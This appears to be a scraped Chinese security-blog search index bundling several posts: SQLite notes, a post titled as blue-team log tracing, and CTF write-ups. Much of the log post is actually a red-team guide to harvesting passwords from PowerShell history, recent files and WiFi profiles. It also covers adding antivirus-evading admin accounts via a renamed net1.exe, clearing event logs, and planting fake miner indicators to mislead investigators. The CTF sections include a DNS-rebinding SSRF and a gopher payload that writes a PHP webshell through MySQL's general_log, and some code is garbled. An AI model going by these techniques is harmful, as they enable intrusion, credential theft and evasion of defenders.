sqlite_master;select sql from sqlite_master where type='';select sql from sqlite_master where type='' and name =''; 如果查出来的view，可以直接查询 CREATE VIEW view_p_sum (Product, P_SUM) ASSELECT Product, Price*Quantity FROM p_orders GROUP BY Product;##可以使用select * from view_p_sum","link":"/2021/12/09/sqlite%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"title":"蓝队日志溯源","text":"windwos主机信息收集Windows主机信息收集powershell命令历史记录可以使用powershell进行查看 powershell Get-Content (Get-PSReadlineOption).HistorySavePath 某些情况下，该命令可能无法使用，我们可先用dir查看powershell历史命令记录文件的存放位置，然后使用type进行读取 %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt%appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt PS：打点时遇到Windows环境的文件下载漏洞，可下载以下文件进行敏感信息翻阅，某些运维会使用powershell进行管理工作组或域内机器，运气好的可以找到ssh、数据库这类登录密码或其它重要文件，尤其是一些运维用的脚本，里面大多包含主机、数据库登录密码，可通过powershell历史记录找到这些脚本的绝对路径，然后在使用文件下载漏洞进行读取，这也是一个不错的突破点，而且这些历史命令大多包含链接主机信息，可提取里面的IP段，扩宽我们的攻击面。 C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 渗透结束时，如果使用过powershell的，务必清除powershell命令历史记录，在一定程度上可以减少被溯源成功的概率，当然，也可以迷惑蓝队，写入一些奇怪的命令，例如把上线的C2地址更改为境外的已公开IOC情报的挖矿IP，然后丢进来几个挖坑样本，误导蓝队进行溯源消耗防守方的精力，伪造痕迹的时候记得更改文件时间，还得注意下语言文字这些细节，不然蓝队看到中文名字、错误语法和时间的挖矿，结合攻防演练时间，第一时间肯定会知道这是伪造出来的，如果内网存在IDS这样的流量审计设备，蓝队一定位机器查看设备流量，说不定还可能暴露我们的踪迹 这目录里面放着电脑的历史打开文件记录，看过什么文件、什么时候，包括点过那几个盘，都很详细的记录，我们可通过该目录定位运维常用的文件夹、文件等，寻找敏感信息，查看这个目录往往有奇效，很多时候运维为了方便管理机器喜欢用密码小本本来记录各个机器的密码，毕竟一个运维管理几十台机器是非常常见，这么多密码不一定记得住，所以大多数运维会选择把机器密码记录在txt、xls这种文件里，这也就给了我们可乘之机，其实我在这个目录遇到最多的还是运维写的日报、周报，很多时候这些报告里面包含了大量服务器信息，这时候我们就可以通过这些敏感信息进一步内网横向。 recent 大多数时候我们的起点都是webshell权限，如果没有判断管理员是否在线，是否有IDS这种流量检测设备，那么在第一时间最好不要冒然远程过去，不然就是得不偿失了；recent无法使用，这时候我们可以使用dir读取历史打开文件，然后再利用dir搜索关键字得到文件的绝对路径，这样我们就可以直接在webshell中进行查看或下载回来本地打开了。 dir %APPDATA%\\Microsoft\\Windows\\Recentdir C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recentdir /a /s /b c:\\password.txt 其它的常用关键字搜索， dir /a /s /b c:\\*.conf *.ini *.inc *.config dir /a /s /b c:\\conf.* config.* dir /a /s /b c:\\*.txt *.xls *.xlsx *.docxfindstr /s /i /n /d:C:\\ /c:&quot;pass&quot; *.config 某些时候显示内容过多，可对这些关键字进行逐个搜索，或使用findstr进行过滤，如: dir /a /s /b c:\\*.conf *.ini *.inc *.config | findstr &quot;运维&quot;dir /a /s /b c:\\*.txt *.xls *.xlsx *.docx | findstr &quot;密码&quot; 另外可到回收站翻翻，很多时候会有惊喜。 前面说到了recent目录记录到了查看历史打开文件，在后渗透时，我们通常会往目标机子上传各种文件，例如nps、mimikatz、psexec等，这些工具在使用过程中，大多会在recent目录产生记录，这时候为了更好的隐藏痕迹，我们可以rd命令删除运行记录或直接使用CS或webshell管理工具提供的文件管理功能删除该记录，另外psexec成功登录退出后，会在目标机器的安全日志中产生Event 4624、4628、4634，在系统日志中产生Event 7045（记录PSEXESVC安装）、Event 7036（记录PSEXESVC服务状态），Windows日志也需要处理下；关于清理痕迹不是本文的主题，就不多赘述了，对于应急的同学可以多关注下recent文件夹和Windows日志，在不手动清理或者使用某些安全工具清理垃圾的时候，recent这个目录为空或者很少东西，那么应该要注意下了。 rd /s 文件 windows 日志路径： 系统日志：%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx安全日志：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx应用程序日志：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx日志在注册表的键：HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\EventlogIIS默认日志位置：%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ powershell清除Windows事件日志 PowerShell -Command &quot;&amp; {Clear-Eventlog -Log Application,System,Security}&quot;Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} PS：上传后的文件如果不能删除（没权限或其它因素），那么可以上传或新建同名文件，覆盖掉原有文件。 敏感文件寻找 服务器、中间件、数据库这类配置文件。 运维密码、工作记录、个人记录这些。 公司文件、合同、网络拓扑图这类。 …… 服务器、中间件、数据库这类配置文件的重要性大家都懂，渗透的时候如果获取到一个包含大量敏感信息的配置文件，那将会为我们在后渗透作出良好的铺垫，如下。 某次项目时，拿到一个存在内网的shell，通过对主机信息收集，发现某配置文件Config-back.xml包含了大量的数据库账号密码，之后使用CS下载该配置文件到本地，然后搭建代理利用这些账号密码批量上线MSSQL主机，再结合这些密码制作出高质量字典爆破C段机器，用了不到30分钟拿到了200多台机器权限，所以说渗透的本质是信息搜集，信息搜集的量决定着我们渗透的成果，关于配置文件的查找这里就不多说了，可参考上面的dir命令进行查找。 dir /a /s /b d:\\conf.* config.* 另外就是要多关注下web系统本身存放的文件，之前遇到过一个IBM系统，里面有个云盘功能，之后翻这个功能模块找到了个运维建立的文件夹，里面存放了大量的数据，什么网络拓扑图、运维日志、甚至还有账号密码，还有的就是做等保渗透的时候，远程到运维机，桌面一大堆设备清单，还有各个系统的账号密码，而且这些xlsx表格都是不加密的，直接打开就能查看，一些运维为了贪图方便，往往会非常严重的安全隐患，给了入侵者很大的机会。 这里再补充一下WiFi密码获取这个点，在内网渗透，密码获取到的越多，路就越好走，很多时候内网的密码都是通用的，就算是不通用，大部分的密码也是有规律可循的，关于密码的获取可使用LaZagne。 CMD获取WiFi密码 netsh wlan show profilesnetsh wlan show profiles name=&quot;WiFi名称&quot; key=clear通过for循环一次性获取全部WiFi密码for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 如果已经取得当前机器的管理员权限的话，可运行mimikatz、procdump之类凭据获取工具获取系统凭据，因为多数管理员可能使用同一密码或有规律性的密码来管理多台服务器，如果能够得到主机密码或者hash就可以尝试pth或psexec批量上线了；还有就是在进程收集的时候要多留意一下是否有域管启用的进程，如果刚好域管理员登录过我们已经有权限的机器，那么就可以利用域管进程进行横向了，如果没有的话可关注下ms14068，域委派这类东西，这些都是后渗透基本常识了，这里不多赘述。 域信息收集常用命令常用命令 net use 查看ipc连接情况net user /domain 获取域用户列表net user test 123 /add 添加用户neet localgroup administrators test /add 添加test用户到管理组，一般情况下，管理组才能远程桌面net group /domain 查询域里面的组net group &quot;domain admins&quot; /domain 获取域管理员列表net group &quot;enterprise admins&quot; /domain 查看当前域中企业管理员组用户net group &quot;domain computers&quot; /domain 查看当前域中的所有的计算机名（登录过该域的计算机）net group &quot;exchange servers&quot; /domain 查看域内是否存在Exchangenet group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台)net config workstation 查看当前登录域net view 查看同一域内机器列表net view \\\\ip 查看某IP共享net view \\\\test 查看test计算机的共享资源列表net view /domain 查看内网存在多少个域Net view /domain:test 查看test域中的机器列表wmic useraccount get Caption,sid 获取域内所有用户sidsetspn -T target.com -Q */* 获取当前域内所有spnfor /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i&quot;ttl&quot;for /l %i in (1,1,255) do @ping 10.10.10.%i -w 1 -n 1 | find /i&quot;ttl&quot; 网络信息查找 ipconfig /all 查看当前主机的主机名/IP/DNS等信息route print 查看路由表信息netstat -ano 查看开放情况，有些时候能获取到别的IP段arp -a 查看arp解析情况 寻找内网网段时建议被动寻找，主动寻找动静太大，如nmap、nbtscan这种一扫，可能整个网段内存活的机器就出来了，但随之而来的是IDS的流量审计，一旦引起流量异常被蓝队察觉，可能就会导致我们权限的丢失，永远不要小瞧蓝队，而且还是拥有各种安全设备的蓝队，内网渗透一定要谨慎，大规模资产扫描，自动化漏洞扫描我一般会留到最后才上的。 定位域控 查看域时间，一般域控会做时间服务器 net time /domain 通过dns定位域控 ipconfig /allipconfig /displaydns 有些时候可以在dns缓存得到域控信息 利用netdom获取域控列表，得到域控名称可通过ping获取域控IP netdom query dc 其它信息查找 systeminfo 查看补丁情况，也能看到当前机器是否加入域环境net group &quot;domain controllers&quot; /domain 查询域控nslookup -type=SRV _ldap._tcp.corp 通过srv记录获取域控地址nltest /dclist:corp 使用nltest查询域控列表tasklist /svc 查看进程及对应服务名cmdkey /l 查看当前保存的登陆凭证type c:\\Windows\\system32\\drivers\\etc\\hosts 可以发现些内网IP 其它补充web日志 有些老系统会使用get+明文的方式传输后台登录账号密码，我们可翻查下web日志，说不定有收获，还有就是要注意系统本身的日志，这些日志大多包含内网IP段，甚至还有账号密码这些东西。 使用net1.exe绕过杀软添加用户 windows环境渗透添加用户往往会被AV拦截，而且还会产生告警日志，这时候可使用net1.exe绕过杀软添加用户，当然，也可使用cs自带的argue参数污染进行用户添加。 net1.exe cd c:/windows/system32copy net1.exe svchost.txtsvchost.txt user svchost M@Bas#as#@123 /addnet localgroup administrators svchost /addsvchost.txt user svchost M@Bas#as#@123 /add &amp; net localgroup administrators svchost /add argue参数污染 net1 argue net1 aaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssssssssssssssssssexecute net1 user svchost M@Bas#as#@123 /addexecute net1 localgroup administrators svchost /add 正常使用net添加用户会被火绒拦截 添加用户并加到管理员组 m1kh.txt user m1kh M@Bas#as#@123 /add &amp; net localgroup administrators m1kh /add linux主机信息收集网络信息收集last 多数运维会接入内网登录系统，这时候，便可获取部分内网ip 进而对内网IP段进行画像Ifconfig -a/arp -a/netstat -anopt/ss -nt 这些就不多说了Route -n 内网路由情况，也能为内网网络拓扑提供一定的信息IPtables 防火墙情况，有时候会存在内网网络通行规则，也能提供一定信息.... 敏感文件收集grep &quot;password:&quot; * -Rnfind / -name &quot;config.*&quot;find / -name &quot;databases.*&quot;find / -name &quot;config.*&quot; | xargs grep &quot;password&quot;&quot; 其他补充history命令history 在linux渗透时是非常实用的，各种连接密码，ssh、mysql、ftp等等，在拿到权限是应该着重看看这个文件 日志相关命令last命令记录着所有用户登录系统的日志，可以用来查找非授权用户的登录事件，而last命令的输出结果来源于/var/log/wtmp文件，稍有经验的入侵者都会删掉/var/log/wtmp以清除自己行踪，但是还是会露出蛛丝马迹在此文件中的。 可用以下命令分析用户登录行为 who 查看当前登录用户（tty本地登陆 pts远程登录）w 查看某一时刻用户的行为uptime 查看有多少用户，以此确定是否存在异常用户lastb 显示登录失败次数，判断是存在ssh爆破last 显示用户最近登录信息。lastlog 登录成功记录 进程和端口检查进程检查 用ps命令查看服务器上的所有进程，定位恶意进程。 ps -a 列出的是当前控制终端启动的进程ps -A 系统全部启动进程ps auxf 查看父进程关联的子进程pstree 查看进程树 进程过多的话也可以用命令：ps -aux | grep 进程名 定位到恶意程序 ps -aux | grep 进程名 proc这里简要说一下proc： /proc 是一个伪文件系统，这个伪文件系统让你可以和内核内部数据结构进行交互，与真正的文件系统不同的是它是存在于内存中而不是真正的硬盘上，所以重启后/proc会被重置掉，linux 下有一个说法即一切皆文件，所有在linux上运行的程序都在/proc下有一个自己的目录，目录名字为程序的Pid号，目录里面存储着许多关于进程的信息，列如进程状态status，进程启动时的相关命令cmdline，进程的内存映像maps，进程包含的所有相关的文件描述符fd文件夹等等其中 /proc/pid/fd 中包含着进程打开的所有文件的文件描述符，这些文件描述符看起来像链接文件一样，通过ls -l 你可以看见这些文件的具体位置，但是它们并不是简单连接文件，你可以通过这些文件描述符再打开这些文件，你可以重新获得一个新的文件描述符，即使这些文件在你所在的位置是不能访问，你依然可以打开。 还一个 /proc/pid/exe 文件，这个文件指向进程本身的可执行文件。 所以在得到PID后，我们就能利用以下命令获取该PID所对应的进程文件路径，获取进程的详细信息了： ls -l /proc/$PID/exefile /proc/$PID/exe（$PID 为对应的pid 号）which name 查看程序在哪个文件夹 name表示程序名lsof /usr/bin/* 查看某个路径下的运行中的进程列表pidof /usr/bin/* history信息检查攻击者入侵后，往往会顺手把历史操作命令给清除掉（history -c），但此命令并不会清除保存在文件中的记录，因此打开/home各帐号目录下的.bash_history，查看每个用户目录下的.bash_history文件，特别是/root目录下的.bash_history文件，此文件中记录着用户执行的所有历史命令，很多时候攻击者会通过wget下载恶意木马到服务器，这时候查看history说不定就能捕获攻击者的C2服务器了。 historycat /root/.bash_history &gt; root_history.txthistory -w history优化 cat /etc/ssh/sshd_config 历史的命令增加登录的IP地址、执行命令时间等信息：1. 保存1万条命令sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile2. 在/etc/profile的文件尾部添加如下行数配置信息：##history优化USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;3. source /etc/profile让配置生效生成效果： 329 2021-04-14 16:39:43 183.6.56.66 root cat /etc/profile 主机服务分析枚举主机所有服务，查看是否有恶意服务。 service --status-allchkconfig –list #列出所有的系统服务 定时任务分析定时任务对于玩CTF和做渗透的师傅应该都不陌生 查看单个用户的定时任务 crontab -l 循环遍历所有用户的定时任务 for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done anacron异步定时任务查看 cat /etc/anacrontab 除此之外，以下目录中也可能存在恶意脚本，需进一步排查。 /var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* 查看CPU运行定位挖矿时很实用 top ssh秘钥分析redis未授权访问漏洞可直接向服务器写入公钥，从而实现无密码登录服务器，之前也写过类似的文章，所以要重点关注/etc/.ssh、 ~/.ssh 目录下有无可疑公钥 ll -al /etc/ssh/ll -al /root/.ssh/ 日志分析查看日志是查找攻击源最好的方法，虽然耗时长；linux日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 主机日志分析查看登录失败信息 grep -o &quot;Failed password&quot; /var/log/secure|uniq -c 输出登录爆破的第一行和最后一行，确认爆破时间范围 grep &quot;Failed password&quot; /var/log/secure|head -1 grep &quot;Failed password&quot; /var/log/secure|tail -1 查看有哪些IP在爆破root帐号 grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 输出有爆破行为的IP grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c 输出被爆破的用户名 grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\\n&quot;;}'|uniq -c|sort -nr 查看登录成功的日期、用户名、IP grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 查看哪些IP登录成功了 grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more web日志分析先统计请求ip，方便后续分析（取出日志可用sz命令或者xftp） awk '{print $1}' blog.m1kh.com.log | sort | uniq -c | sort -rn | moreawk '{print $1}' blog.m1kh.com.log | sort | uniq -c | sort -rn &gt; 统计下日志有多少行 wc -l blog.m1kh.com.log #-l统计行数cat -n blog.m1kh.com.log | tail -1 状态码统计 cat blog.m1kh.com.log |awk '{print $9}'|sort|uniq -c|sort -rn URL 统计（200） grep &quot;183.6.56.66&quot; blog.m1kh.com.log | awk '{if ($9==200) print $1,$7,$9}' 查看并统计200的状态码及ip（去重后） cat blog.m1kh.com.log | awk '{if ($9=200) print $1,$7,$9}'|sort|uniq -c|sort -rn | head -20 有时候遇到目录扫描会产生大量日志，这时候我们可以分开看，可用awk进行分割，只看状态码为200的。 more blog.m1kh.com.log | egrep &quot;\\.zip|\\.rar|\\.mdb|\\.inc|\\.sql|\\.config|\\.bak|/login.inc.php|/.svn/|/mysql/|config.inc.php|\\.bak|wwwroot|网站备份|/gf_admin/|/DataBackup/|/Web.config|/web.config|/1.txt|/test.txt|www.zip|www.tar&quot; &gt; test.log[root@m1kh wwwlogs]# more test.log | awk '{if($9==200) {print $1,$2,$3,$4,$6,$7,$8,$9}}'183.6.56.66 - - [12/Apr/2021:18:14:44 &quot;GET /config.inc.php HTTP/2.0&quot; 200183.6.56.66 - - [12/Apr/2021:18:14:45 &quot;GET /config.inc.php HTTP/2.0&quot; 200 杂项开机启动的一些路径 /etc/rc.d/rc/etc/rc/etc/rc.local/etc/rc.d/rc.local/etc/rc.d/rc/etc/rc$runlevel.d/ 该目录下都是链接的可执行文件，也可以自己添加可执行程序/etc/ld.so.cache /etc/ld.so.preload /usr/local/lib/libioset.so/etc/init.d另外一个添加启动项的地方在 /etc/profile里面，还有 /etc/profile.d/目录下以sh结尾的文件 grep指令2、grep 查找含有某字符串的所有文件 grep -rn &quot;hello,world!&quot; * : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写 4、find /etc -name init //在目录/etc中查找文件init A、/var/log/secure1、定位有多少IP在爆破主机的root帐号： grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c爆破用户名字典是什么？ grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\\n&quot;;}'|uniq -c|sort -nr2、登录成功的IP有哪些： grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep &quot;useradd&quot; /var/log/secure 4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'# grep &quot;userdel&quot; /var/log/secure5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now","link":"/2021/12/03/%E8%93%9D%E9%98%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"},{"title":"2021hitcon","text":"前言正好遇上黑盾杯比赛，所以就没打了，但是题目肯定还是要复现的，毕竟是国际重量级的比赛。 one-bit-man","link":"/2021/12/09/2021hitcon/"},{"title":"2021黑盾杯","text":"\\dns协议**下载下来得到一队01文件，猜测是画图题from PIL import Image import matplotlib.pyplot as plt Loca_img = Image.new(‘RGB’,(500,500),(255,255,255)) with open(‘dddd.txt’,”r”) as f: f=f.read()[::-1] x,y =Loca_img.size cnt = 0 for i in range(y): ​ for j in range(x): ​ if f[cnt]==’0’: ​ Loca_img.putpixel((i,j),(0,0,0)) ​ cnt+=1 plt.imshow(Loca_img) plt.show() Loca_img.save(‘flag.png’) 得到flag图片，上面缺了一个角，但是我们知道，那个是定位角，都是一样的，在ps里面吧旁边那个格子补过去就行了，然后扫码得到flagflag{5E57527B60} \\日志分析** 很明显是sql盲注的流量，把他urldecode一下， 可以看到675的长度才是正确的，然后对其进行ascii码对照一下可以得到ngjfdsUbdK \\dns协议** 一开始在wireshark里面看，没看到什么东西，卡了有点久，就去kali里面直接把所有内容列出来了 很明显，直接看到一串类似base64加密的东西，解码一下就拿到flag了 \\Decode**看到pk头了，又看到decode.txt，分一下，就可以拿到 尝试GCD函数，发现可行 import libnum n1 = 15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591 n2 = 28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749 n3 = 18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839 e1 = 65537 e2 = 27751 e3 = 65537 c1 = 5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206 c2 = 21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741 c3 = 13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486 p1 = libnum.gcd(n1,n2) p3 = libnum.gcd(n2,n3) def get_flag(c,n,e,p): #p2 = p1 q = n//p phi = (p-1)*(q-1) d = libnum.invmod(e,phi) flag = libnum.n2s(pow(c,d,n)) return flag if name==”main“: get_flag(c1,n1,e1,p1) 分别拿到三组flag 然后decode组合一下 就拿到flag了 \\在线电力控制系统消息传送**一开始用ssrf测试的，发现好像不太对 他需要有个dianli.com在开头，继续往下看，发现吧http去掉依旧可以， 发现没有这个东西，，在测试了一下，原来是/flag.txt \\myTemplate**还好www.zip有源码，所以直接审计源码就行 public function render(){ ​ extract($this-&gt;data); ​ if (!isset($file)) { ​ $content = file_get_contents($this-&gt;templte_file); ​ }else{ ​ $content = file_get_contents($file); ​ } ​ eval(‘?&gt;’ . $content); } 这个漏洞太明显了，file_get_contents，而且输入可控 捋一下思路，首先是file这个参数会被读取，然后它使用了extract函数==，那我们直接url传入一个file值，就会被这个模板给渲染了，接下来就会在后面的页面被解析了 Payload admin.php?file=/flag.php \\ICS-Modbus的秘密**字符串搜索，直接出flag \\Magiccurl**通过dns重绑定绕过对请求ip的限制 https://lock.cmpxchg8b.com/rebinder.html 需要多次请求，一直到读出密码为止，得到密码 http://39.104.66.84:12460/index.php?url=http://7f000001.01010101.rbndr.us/admin.php ``` DssT2M2cjDNKaew ``` 接下来利用gopher协议攻击本地mysql，通过导出general_log文件来getshell 要执行的sql语句 ``` set global general_log = “ON”; set global general_log_file=”/var/www/html/1.php”; select ‘‘; ``` 用gopherus生成payload，然后用脚本发送 ``` import requests url=”http://39.104.66.84:12460/&quot; data={ “password”:”DssT2M2cjDNKaew”, #“url”:”dict://127.0.0.1:3306” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%24%00%00%00%03%53%48%4f%57%20%47%52%41%4e%54%53%20%46%4f%52%20%27%74%65%73%74%27%40%27%6c%6f%63%61%6c%68%6f%73%74%27%3b%01%00%00%00%01” #“url”:”gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%27%00%00%00%03%73%68%6f%77%20%67%6c%6f%62%61%6c%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%27%25%73%65%63%75%72%65%25%27%3b%01%00%00%00%01” 